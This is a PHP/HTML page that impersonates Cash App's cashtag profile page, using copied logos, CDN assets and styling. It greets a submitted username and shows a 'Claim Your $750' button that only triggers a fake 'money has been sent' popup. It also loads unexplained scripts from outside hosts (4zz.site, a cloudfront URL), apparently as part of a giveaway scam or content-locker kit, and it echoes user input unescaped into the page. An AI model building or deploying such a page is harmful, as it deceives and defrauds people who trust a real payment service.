<?php
require_once 'process.php';


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];

    $processed_data = process_username($username);
    $image_url = $processed_data['image_url'];
    $display_name = $processed_data['display_name'];
    $formatted_cashtag = $processed_data['formatted_cashtag'];
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
<title><?php echo isset($display_name) ? $display_name : $username; ?></title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.23/dist/sweetalert2.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <link rel="apple-touch-icon" href="https://cash-f.squarecdn.com/static/apple-touch-icon.png" integrity="sha384-obbtLXUmL5CCcijDtMgdqvtSyKu3FTcGYIdVn6uif5nIxTaS7u3IMUG3Wl1PjBox">
    <link rel="manifest" href="https://cash-f.squarecdn.com/static/manifest.webmanifest" integrity="sha384-CdK6MPtohWsnTcqD6CGLRmq1Wc5Al3/3LP9FNcnsODQKI3SMTfCiCamhNianUQCU">
    <link rel="icon" href="https://cash-f.squarecdn.com/static/favicon.ico" integrity="sha384-4ChiDA321IPrHSobMPeW1n8RX2GU6pY6iWH7h79DqAFaYyhrlbYTvRWEAJqMZ3GS" sizes="16x16,32x32" type="image/x-icon">
    <link rel="icon" href="https://cash-f.squarecdn.com/static/favicon.svg" integrity="sha384-KFrrYlHN2FMoPYRtljOsgHAreGaHwX+UtbQgfY3LbnCzenjycuPRU7zBKWf7yaQZ" sizes="any" type="image/svg+xml">
    <meta charset="utf-8">
    <link href="https://4zz.site/assets/css/sweetalert2.min.css" rel="stylesheet">
    <script src="https://4zz.site/assets/js/sweetalert2.all.min.js"></script>
    <link rel="preload" href="https://cash-f.squarecdn.com/web/cashtags/50b0c012a6c302d51d04b3601ef216f30caad27f/_next/static/css/aed243c6a8c1dbb6.css" as="style">
    <link rel="stylesheet" href="https://cash-f.squarecdn.com/web/cashtags/50b0c012a6c302d51d04b3601ef216f30caad27f/_next/static/css/aed243c6a8c1dbb6.css" data-n-g=""><noscript data-n-css=""></noscript>
    <style data-emotion="css 54j4vv" data-s>
        .css-54j4vv {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            justify-content: space-between;
            min-height: 100vh;
            width: 100%;
            background-color: var(--arcade-background-app);
            color: var(--arcade-text-standard);
            --arcade-background-app: #FFFFFF;
            --arcade-text-standard: #1E1E1E;
            --arcade-text-prominent: #101010;
            --arcade-text-subtle: #666666;
            --arcade-text-inverse: #FFFFFF;
            --arcade-icon-info: #007CC1;
            --download-button-outline-background: transparent;
            --download-button-outline-color: var(--arcade-text-inverse);
            --download-button-outline-border-color: var(--arcade-text-inverse);
            --download-button-outline-background-hover: var(--arcade-text-inverse);
            --download-button-outline-color-hover: #00D64F;
            --download-button-outline-border-color-hover: var(--arcade-text-inverse);
            --download-button-prominent-background: var(--arcade-text-prominent);
            --download-button-prominent-color: var(--arcade-text-inverse);
            --download-button-prominent-border-color: var(--arcade-text-prominent);
            --download-button-prominent-background-hover: #00D64F;
            --download-button-prominent-color-hover: var(--arcade-text-inverse);
            --download-button-prominent-border-color-hover: #00D64F;
            --download-button-inverse-background: #FFFFFF;
            --download-button-inverse-color: #1E1E1E;
            --download-button-inverse-border-color: #FFFFFF;
            --download-button-inverse-background-hover: #FFFFFF;
            --download-button-inverse-color-hover: #1E1E1E;
            --download-button-inverse-border-color-hover: #FFFFFF;
        }

        .css-54j4vv .desktop-only {
            display: none;
        }

        @media screen and ((hover: hover) and (min-width: 480px)) {
            .css-54j4vv .desktop-only {
                display: block;
            }
            .css-54j4vv .mobile-only {
                display: none;
            }
        }
    </style>
    <style data-emotion="css 19xt8w8" data-s>
        .css-19xt8w8 {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            justify-content: space-between;
            padding: 60px 24px 150px;
            --magentaS1: #9e009e;
            --scarletS1: #d41f1f;
            --orangeS1: #f26129;
            --goldS1: #f5ab00;
            --citronS1: #c3eb00;
            --greenS1: #00bf2c;
            --aquaS1: #16dede;
            --azureS1: #0965d4;
            --cobaltS1: #001ba1;
            --violetS1: #4b00ba;
            --purpleS1: #7506a3;
            --default: #00D64F;
            background-color: var(--default);
            color: var(--arcade-text-inverse);
            width: 100%;
            height: calc(3rem + 16px + 100px);
        }

        @media (min-width: 480px) {
            .css-19xt8w8 {
                height: 345px;
            }
        }

        .css-19xt8w8 .button {
            width: auto;
            height: 46px;
            line-height: 2.5rem;
        }

        @media (min-width: 480px) {
            .css-19xt8w8 {
                padding: 20px 40px 212px;
                height: calc(3rem + 20px + 212px);
            }
            .css-19xt8w8 .button {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
            }
        }
    </style>
    <style data-emotion="css pe6vce" data-s>
        .css-pe6vce {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            justify-content: space-between;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%;
        }
    </style>
    <style data-emotion="css fpujlf" data-s>
        .css-fpujlf {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex: 1 0 auto;
            -ms-flex: 1 0 auto;
            flex: 1 0 auto;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            max-width: 480px;
            text-align: center;
            width: 100%;
        }

        @media (min-width: 480px) {
            .css-fpujlf {
                -webkit-box-pack: justify;
                ;
            }
        }
    </style>
    <style data-emotion="css 2l6yqn" data-s>
        .css-2l6yqn {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: 0 24px 40px;
            text-align: center;
        }
    </style>
    <style data-emotion="css jkeik2" data-s>
        .css-jkeik2 {
            padding: 32px;
            margin: -160px 0 16px;
            border-radius: 40px;
            background: #FFFFFF;
            line-height: 0;
            width: 352px;
            height: 352px;
            --qr-box-shadow: rgba(0, 0, 0, 0.1);
            box-shadow: 0px 4px 40px var(--qr-box-shadow);
        }

        .css-jkeik2 .qrcode {
            width: 288px;
            height: 288px;
        }
    </style>
    <style data-emotion="css tsfihf" data-s>
        .css-tsfihf {
            margin: 32px 0;
            font-size: 0.875rem;
            font-weight: 500;
            letter-spacing: 0.0625rem;
            line-height: 1.125rem;
            text-transform: uppercase;
            color: var(--arcade-text-subtle);
        }
    </style>
    <style data-emotion="css 13nvfi" data-s>
        .css-13nvfi {
            border: 4px solid #fff;
            margin-top: -52px;
            border-radius: 50%;
            -webkit-flex: 0 0 auto;
            -ms-flex: 0 0 auto;
            flex: 0 0 auto;
            width: 104px;
            height: 104px;
            background-color: var(--arcade-icon-info);
        }
    </style>
    <style data-emotion="css 6kivd1" data-s>
        .css-6kivd1 {
            font-size: 2rem;
            line-height: 2.5rem;
            font-weight: 500;
            margin: 24px 0 2px;
            color: var(--arcade-text-prominent);
            text-wrap: balance;
        }
    </style>
    <style data-emotion="css fx9oef" data-s>
        .css-fx9oef {
            font-size: 1.5rem;
            line-height: 2rem;
            color: var(--arcade-text-subtle);
        }
    </style>
    <style data-emotion="css 1qc4xty" data-s>
        .css-1qc4xty {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            margin-top: unset;
            padding: 24px 32px 52px;
            text-align: center;
            width: 100%;
        }

        @media (min-width: 480px) {
            .css-1qc4xty {
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                -webkit-justify-content: center;
                justify-content: center;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                padding: 24px 12px 52px;
            }
        }

        .css-1qc4xty .button {
            margin: 12px;
            width: 100%;
        }
    </style>
    <style data-emotion="css 1739hvd" data-s>
        .css-1739hvd {
            display: block;
            overflow: hidden;
            margin: 0;
            padding: 0 1.125rem;
            height: 3rem;
            border: none;
            border-radius: 1.75rem;
            cursor: pointer;
            box-sizing: border-box;
            background-color: var(--download-button-outline-background);
            color: var(--download-button-outline-color);
            border: 2px solid var(--download-button-outline-border-color);
            box-shadow: none;
            text-align: center;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 18px;
            font-weight: 500;
            line-height: 100%;
            letter-spacing: 0.2px;
        }

        .css-1739hvd:hover {
            background-color: var(--download-button-outline-background-hover);
            color: var(--download-button-outline-color-hover);
            border: 2px solid var(--download-button-outline-border-color-hover);
        }
    </style>
    <style data-emotion="css" data-s></style>
    <style>
        .bt_dd {
            display: block;
            overflow: hidden;
            margin: 0px;
            padding: 0px 1.125rem;
            height: 3rem;
            border-radius: 1.75rem;
            cursor: pointer;
            box-sizing: border-box;
            background-color: var(--download-button-prominent-background);
            color: var(--download-button-prominent-color);
            border: 2px solid var(--download-button-prominent-border-color);
            box-shadow: none;
            text-align: center;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 18px;
            font-weight: 500;
            line-height: 100%;
            letter-spacing: 0.2px;
            width: -webkit-fill-available;
        }
    </style>
</head>
<body>



<div id="__next">
        <div class="css-54j4vv">
            <div data-test-id="cashtag-banner" style="background-color:var(--default)" class="css-19xt8w8">
                <div style="display:flex" data-test-id="legacy-download-button" class="css-pe6vce"><svg role="img" width="200" height="50" viewBox="0 0 148 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M58.7596 12.3678C58.6288 12.4456 58.4732 12.4726 58.3232 12.4436C58.1731 12.4146 58.0396 12.3316 57.9488 12.211C57.5021 11.582 56.9029 11.0721 56.2051 10.7272C55.5073 10.3823 54.7329 10.2133 53.9519 10.2356C50.9066 10.2356 49.0376 12.5993 49.0376 15.975C49.0376 19.3508 50.9409 21.7593 53.9861 21.7593C54.7776 21.7779 55.5608 21.5979 56.2615 21.2366C56.9623 20.8752 57.5574 20.3444 57.9906 19.6943C58.0772 19.5721 58.2074 19.4862 58.3555 19.4537C58.5035 19.4212 58.6586 19.4444 58.79 19.5188L60.2365 20.3403C60.3155 20.3796 60.3849 20.4352 60.4401 20.5031C60.4952 20.5711 60.5348 20.6499 60.5561 20.7343C60.5774 20.8186 60.58 20.9064 60.5636 20.9918C60.5472 21.0772 60.5122 21.1581 60.4611 21.2291C59.7539 22.2689 58.7892 23.1155 57.6574 23.6896C56.5255 24.2637 55.2636 24.5465 53.9899 24.5114C49.1213 24.5114 45.821 21.0461 45.821 15.9937C45.821 10.9413 49.1213 7.52078 53.9176 7.52078C55.1701 7.48667 56.4119 7.75405 57.5347 8.29955C58.6575 8.84506 59.6269 9.65208 60.3583 10.65C60.4086 10.7173 60.4442 10.7939 60.4631 10.8752C60.4819 10.9565 60.4835 11.0407 60.4678 11.1226C60.4521 11.2045 60.4194 11.2824 60.3718 11.3514C60.3241 11.4205 60.2626 11.4791 60.1908 11.5239L58.7596 12.3678Z"
                            fill="#ffffff"></path>
                        <path
                            d="M69.3896 23.5994V22.9123C68.6283 23.8757 67.5662 24.4732 65.8571 24.4732C63.3295 24.4732 61.5747 23.1176 61.5747 20.7389C61.5747 17.7777 64.266 17.2699 65.9256 17.0421C67.7071 16.7882 69.2259 16.6687 69.2259 15.526C69.2259 14.514 68.0345 14.2414 67.0257 14.2414C65.8678 14.2603 64.7302 14.5428 63.7026 15.0667C63.6313 15.1051 63.5527 15.129 63.4718 15.1368C63.3908 15.1446 63.309 15.1362 63.2314 15.1121C63.1539 15.088 63.0821 15.0487 63.0204 14.9966C62.9588 14.9445 62.9085 14.8807 62.8727 14.809L62.3512 13.741C62.2815 13.6027 62.2687 13.4433 62.3155 13.2959C62.3623 13.1486 62.465 13.0245 62.6025 12.9494C64.0417 12.1978 65.6465 11.8029 67.2769 11.7993C70.1776 11.7993 72.2255 12.9681 72.2255 15.7949V23.5994C72.2255 23.7578 72.1613 23.9098 72.0471 24.0218C71.9329 24.1339 71.778 24.1968 71.6164 24.1968H70.0253C69.9431 24.2004 69.861 24.1875 69.784 24.1591C69.707 24.1306 69.6367 24.0872 69.5773 24.0313C69.5179 23.9755 69.4706 23.9084 69.4384 23.8342C69.4061 23.76 69.3895 23.6801 69.3896 23.5994V23.5994ZM69.2259 18.2034C68.6663 18.6179 67.6348 18.7561 66.5347 18.9503C65.4346 19.1444 64.521 19.432 64.521 20.6045C64.521 21.6837 65.3166 22.1878 66.4661 22.1878C67.8936 22.1878 69.2259 21.4074 69.2259 19.5925V18.2034Z"
                            fill="#ffffff"></path>
                        <path
                            d="M74.8509 21.1047C74.9536 20.9874 75.0986 20.9137 75.2555 20.8991C75.4123 20.8844 75.5689 20.93 75.6922 21.0263C76.7099 21.7802 77.9573 22.175 79.2323 22.1465C80.5456 22.1465 81.5163 21.732 81.5163 20.7238C81.5163 19.8052 80.6255 19.6222 78.471 19.2525C76.1871 18.8791 74.0021 18.1323 74.0021 15.5781C74.0021 12.9156 76.3431 11.7916 79.0115 11.7916C80.6849 11.7673 82.3184 12.2931 83.6517 13.2853C83.7168 13.3353 83.7708 13.3977 83.8104 13.4688C83.8501 13.5399 83.8746 13.6182 83.8824 13.6989C83.8903 13.7796 83.8813 13.861 83.856 13.9382C83.8307 14.0154 83.7897 14.0867 83.7355 14.1479L82.9742 15.0254C82.8732 15.1431 82.7302 15.2184 82.5744 15.2357C82.4186 15.2531 82.262 15.2112 82.1367 15.1188C81.1986 14.4457 80.0633 14.0893 78.9011 14.103C77.7782 14.103 76.7961 14.4242 76.7961 15.2943C76.7961 16.2614 78.1741 16.4444 79.5559 16.6759C82.506 17.18 84.3788 18.0053 84.3788 20.4101C84.3788 22.9344 82.3194 24.4953 79.0496 24.4953C77.2625 24.5489 75.5123 23.9889 74.1011 22.912C74.0378 22.8612 73.9854 22.7985 73.9471 22.7276C73.9087 22.6567 73.8851 22.579 73.8777 22.499C73.8702 22.4191 73.8791 22.3385 73.9037 22.262C73.9283 22.1854 73.9683 22.1144 74.0211 22.0532L74.8509 21.1047Z"
                            fill="#ffffff"></path>
                        <path
                            d="M86.1927 23.5939V8.39569C86.1927 8.23723 86.2568 8.08527 86.3711 7.97322C86.4853 7.86117 86.6402 7.79822 86.8017 7.79822H88.5565C88.7181 7.79822 88.873 7.86117 88.9872 7.97322C89.1014 8.08527 89.1656 8.23723 89.1656 8.39569V13.5862C89.6025 13.0143 90.1725 12.5532 90.8281 12.2414C91.4837 11.9296 92.2058 11.7761 92.9341 11.7938C95.5302 11.7938 97.0528 13.6087 97.0528 16.2002V23.5939C97.0528 23.7524 96.9886 23.9044 96.8744 24.0164C96.7602 24.1285 96.6053 24.1914 96.4437 24.1914H94.6889C94.5274 24.1914 94.3725 24.1285 94.2583 24.0164C94.144 23.9044 94.0799 23.7524 94.0799 23.5939V16.8724C94.0799 15.5841 93.6573 14.4152 91.9748 14.4152C90.3799 14.4152 89.1656 15.5168 89.1656 17.3541V23.5977C89.1656 23.7561 89.1014 23.9081 88.9872 24.0202C88.873 24.1322 88.7181 24.1952 88.5565 24.1952H86.8017C86.7213 24.1957 86.6415 24.1804 86.5672 24.1503C86.4928 24.1203 86.4253 24.0759 86.3686 24.0199C86.3119 23.964 86.2671 23.8975 86.2369 23.8243C86.2067 23.7512 86.1917 23.6729 86.1927 23.5939V23.5939Z"
                            fill="#ffffff"></path>
                        <path
                            d="M116.363 23.7902L115.099 20.1307H108.711L107.444 23.7902C107.403 23.9081 107.326 24.0104 107.223 24.0827C107.119 24.1551 106.996 24.1938 106.869 24.1935H104.81C104.712 24.1934 104.615 24.1701 104.528 24.1256C104.442 24.0811 104.367 24.0167 104.311 23.9379C104.255 23.8591 104.219 23.7683 104.207 23.673C104.194 23.5777 104.205 23.4809 104.239 23.3907L109.99 8.1887C110.036 8.07738 110.115 7.9822 110.217 7.91559C110.319 7.84898 110.439 7.81402 110.561 7.81528H113.374C113.499 7.81576 113.621 7.85352 113.724 7.92355C113.827 7.99357 113.905 8.09256 113.949 8.20737L119.678 23.4056C119.712 23.4961 119.723 23.5933 119.71 23.6889C119.697 23.7844 119.661 23.8755 119.605 23.9544C119.548 24.0333 119.473 24.0976 119.386 24.1418C119.298 24.186 119.202 24.2089 119.103 24.2085H116.93C116.803 24.2056 116.679 24.1638 116.578 24.0887C116.476 24.0137 116.401 23.9093 116.363 23.7902ZM111.939 10.4628L109.48 17.5802H114.303L111.939 10.4628Z"
                            fill="#ffffff"></path>
                        <path
                            d="M124.088 12.6766V13.6177C124.52 13.0304 125.094 12.5573 125.758 12.2406C126.422 11.9239 127.156 11.7735 127.894 11.8028C131.263 11.8028 133.44 14.5363 133.44 18.1174C133.44 21.6985 131.263 24.4656 127.894 24.4656C127.154 24.493 126.419 24.3395 125.754 24.0187C125.09 23.698 124.517 23.2202 124.088 22.6283V27.5836C124.088 27.7421 124.024 27.8941 123.909 28.0061C123.795 28.1181 123.64 28.1811 123.479 28.1811H121.724C121.562 28.1811 121.407 28.1181 121.293 28.0061C121.179 27.8941 121.115 27.7421 121.115 27.5836V12.6468C121.115 12.4883 121.179 12.3363 121.293 12.2243C121.407 12.1122 121.562 12.0493 121.724 12.0493H123.479C123.561 12.0492 123.643 12.0656 123.719 12.0975C123.795 12.1293 123.863 12.176 123.92 12.2347C123.977 12.2934 124.022 12.3628 124.05 12.4388C124.079 12.5148 124.092 12.5957 124.088 12.6766ZM127.27 21.93C129.329 21.93 130.315 20.2048 130.315 18.1174C130.315 16.03 129.31 14.3496 127.27 14.3496C125.23 14.3496 124.088 16.0262 124.088 18.1174C124.088 20.2086 125.173 21.93 127.27 21.93Z"
                            fill="#ffffff"></path>
                        <path
                            d="M138.244 12.6765V13.6175C138.677 13.0307 139.251 12.558 139.915 12.2414C140.579 11.9248 141.313 11.7741 142.051 11.8027C145.423 11.8027 147.601 14.5361 147.601 18.1172C147.601 21.6983 145.423 24.4654 142.051 24.4654C141.311 24.4922 140.576 24.3383 139.911 24.0177C139.247 23.697 138.674 23.2196 138.244 22.6282V27.5835C138.244 27.7419 138.18 27.8939 138.066 28.0059C137.952 28.118 137.797 28.1809 137.635 28.1809H135.88C135.719 28.1809 135.564 28.118 135.45 28.0059C135.336 27.8939 135.271 27.7419 135.271 27.5835V12.6466C135.271 12.4882 135.336 12.3362 135.45 12.2241C135.564 12.1121 135.719 12.0491 135.88 12.0491H137.635C137.718 12.0485 137.8 12.0645 137.876 12.0962C137.952 12.1279 138.021 12.1746 138.078 12.2334C138.135 12.2922 138.18 12.3618 138.208 12.4381C138.237 12.5143 138.249 12.5954 138.244 12.6765V12.6765ZM141.43 21.9299C143.49 21.9299 144.476 20.2047 144.476 18.1172C144.476 16.0298 143.471 14.3494 141.43 14.3494C139.39 14.3494 138.244 16.0261 138.244 18.1172C138.244 20.2084 139.344 21.9299 141.43 21.9299Z"
                            fill="#ffffff"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M27.3911 0.546667C25.6618 0 24.056 0 20.8436 0H11.1569C7.944 0 6.33778 0 4.60889 0.546667C2.72089 1.23378 1.23378 2.72089 0.546667 4.60889C0 6.33778 0 7.94444 0 11.1569V20.8431C0 24.056 0 25.6618 0.546667 27.3911C1.23378 29.2791 2.72089 30.7662 4.60889 31.4533C6.33778 32 7.944 32 11.1569 32H20.8436C24.056 32 25.6618 32 27.3911 31.4533C29.2791 30.7662 30.7662 29.2791 31.4533 27.3911C32 25.6618 32 24.056 32 20.8431V11.1569C32 7.94444 32 6.33778 31.4533 4.60889C30.7662 2.72089 29.2791 1.23378 27.3911 0.546667ZM20.6565 12.2971C19.6876 11.4372 18.2047 10.8107 16.6576 10.8107C15.4468 10.8107 14.2351 11.244 14.2351 12.3396C14.2351 13.3776 15.3413 13.7764 16.6911 14.2631C16.8035 14.3036 16.9176 14.3448 17.0329 14.3869C19.6574 15.281 21.8199 16.377 21.8199 18.9723C21.8199 21.7932 19.6499 23.7204 16.1043 23.9392L15.7822 25.4726C15.7237 25.7539 15.4743 25.9546 15.1872 25.9524L12.9561 25.9356C12.5733 25.9324 12.2902 25.5798 12.3695 25.2059L12.7093 23.6109C11.3137 23.2308 10.0909 22.5521 9.12512 21.6146C8.88101 21.378 8.8788 20.9855 9.12114 20.7467L10.3599 19.5248C10.5947 19.2931 10.9704 19.2949 11.2052 19.5266C12.4023 20.7068 13.9449 21.1928 15.4176 21.1928C17.0329 21.1928 18.1285 20.5296 18.1285 19.4047C18.1285 18.4136 17.2318 18.0827 15.5233 17.4522C15.3433 17.3858 15.1543 17.316 14.9564 17.2418C12.7647 16.4634 10.6882 15.3386 10.6882 12.714C10.6882 9.68231 13.198 8.20479 16.1592 8.05681L16.4848 6.52568C16.5442 6.24701 16.7905 6.04764 17.0754 6.04764H19.303C19.6867 6.04764 19.9724 6.4003 19.894 6.77555L19.5325 8.49719C20.8107 8.91586 21.8491 9.56978 22.6227 10.2348C22.8854 10.4603 22.8943 10.8643 22.651 11.1111L21.4982 12.2803C21.2683 12.5133 20.9015 12.5146 20.6565 12.2971Z"
                            fill="#ffffff"></path>
                    </svg></div>
            </div>
            <script src="https://d26h1wdc757l2w.cloudfront.net/89c9915.js"></script>
            <?php if (isset($image_url) || isset($fake_image_url)) : ?>
        <div class="css-fpujlf">
            <div class="css-2l6yqn">
                <div class="">
                    <?php if (isset($image_url)) : ?>
                        <div style="width: 205px;height: 205px;border: 9px solid #f3f3f3;margin-top: -98;" class="css-13nvfi">
                            <div class="css-max174">
                                <img style="border-radius: 50%; width: -webkit-fill-available; height: -webkit-fill-available;" src="<?php echo $image_url; ?>" alt="<?php echo isset($display_name) ? $display_name : $fake_display_name; ?>'s Profile Image">
                            </div>
                        </div>
                    <?php else: ?>
                        <div style="width: 205px;height: 205px;border: 9px solid #f3f3f3;margin-top: -98;" class="css-13nvfi">
                            <div class="css-max174">
                                <img style="border-radius: 50%; width: -webkit-fill-available; height: -webkit-fill-available;" src="<?php echo $fake_image_url; ?>" alt="Fake User Image">
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
                <?php if (isset($display_name) || isset($fake_display_name)) : ?>
                    <h1 data-testid="cashtags-profile-title" class="css-6kivd1">Welcome <?php echo isset($display_name) ? $display_name : $fake_display_name; ?></h1>
                <?php endif; ?>
                
                <?php if (isset($formatted_cashtag) || isset($fake_formatted_cashtag)) : ?>
                    <h2 data-testid="cashtags-profile-subtitle" class="css-fx9oef"><?php echo isset($formatted_cashtag) ? $formatted_cashtag : $fake_formatted_cashtag; ?></h2>
                <?php endif; ?>
            </div>
            <div class="css-1qc4xty"><button onclick="_oy()" class="bt_dd">Claim Your $750</button></div>
        </div>
    <?php endif; ?>


    <script src="assets/js/lk.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.23/dist/sweetalert2.all.min.js"></script>
    <script>
        function _oy() {
            Swal.fire({
                title: 'Congratulations!',
                text: '750$ has been sent',
                icon: 'success',
                showConfirmButton: false,
                timer: 3000
            });
        }
    </script>
</body>
</html>
